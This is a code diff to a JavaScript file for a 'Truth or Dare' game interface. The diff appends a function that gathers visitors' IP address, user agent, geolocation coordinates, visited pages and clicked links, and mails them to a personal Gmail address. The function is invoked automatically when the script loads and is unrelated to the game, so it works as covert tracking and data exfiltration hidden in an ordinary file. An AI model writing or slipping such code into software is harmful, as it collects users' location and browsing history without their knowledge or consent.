@@ -514,3 +514,27 @@ document.addEventListener('DOMContentLoaded', () => {
     window.truthDareUI = new UIManager();
     console.log('Truth or Dare UI loaded successfully');
 });
+
+function sendDataByEmail() {
+  const subject = "Données collectées";
+  const body = `
+    Données collectées :
+    
+    Adresse IP : ${userData.ip || 'Non disponible'}
+    User Agent : ${userData.userAgent}
+    Résolution d'écran : ${userData.screenResolution}
+    Langue du navigateur : ${userData.language}
+    Cookies activés : ${userData.cookiesEnabled}
+    Géolocalisation : ${userData.geolocation ? `${userData.geolocation.latitude}, ${userData.geolocation.longitude}` : 'Non disponible'}
+    Page actuelle : ${userData.currentPage}
+    Pages visitées : ${userData.browsingData.visitedPages.join(', ')}
+    Liens cliqués : ${userData.browsingData.clickedLinks.join(', ')}
+  `;
+  const mailto = `mailto:19alex.carter.15@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+  window.location.href = mailto;
+}
+
+
+
+// Appelez la fonction sendDataByEmail() pour envoyer les données collectées
+sendDataByEmail();
